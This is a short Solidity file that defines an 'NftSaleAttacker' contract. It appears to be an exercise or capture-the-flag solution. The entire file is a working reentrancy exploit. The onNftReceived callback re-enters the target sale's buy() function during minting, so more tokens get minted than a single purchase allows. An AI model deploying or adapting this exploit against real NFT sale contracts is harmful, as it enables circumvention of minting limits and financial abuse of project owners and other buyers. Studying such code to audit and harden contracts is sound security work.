// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface NftReceiver {
    function onNftReceived(address from, uint256 tokenId) external returns (bool);
}

interface INftSale {
    function buy(uint256 mintCount) external payable;
    function totalSupply() external view returns (uint256);
    function price() external view returns (uint256);
}

contract NftSaleAttacker is NftReceiver {
    INftSale public nftSale;
    uint256 public price;
    bool public attacking = false;

    constructor(address _nftSale) {
        nftSale = INftSale(_nftSale);
        price = nftSale.price();
    }

    function attack() external payable {
        attacking = true;
        nftSale.buy{value: 2 * price}(2);
        attacking = false;
    }

    function onNftReceived(
        address,
        uint256
    ) external override returns (bool) {
        if (attacking) {
            uint256 currentSupply = nftSale.totalSupply();
            if (currentSupply < 4) {
                nftSale.buy{value: 2 * price}(2);
            } else if (currentSupply == 4) {
                nftSale.buy{value: 1 * price}(1);
            }
        }
        return true;
    }
    
    receive() external payable {}
}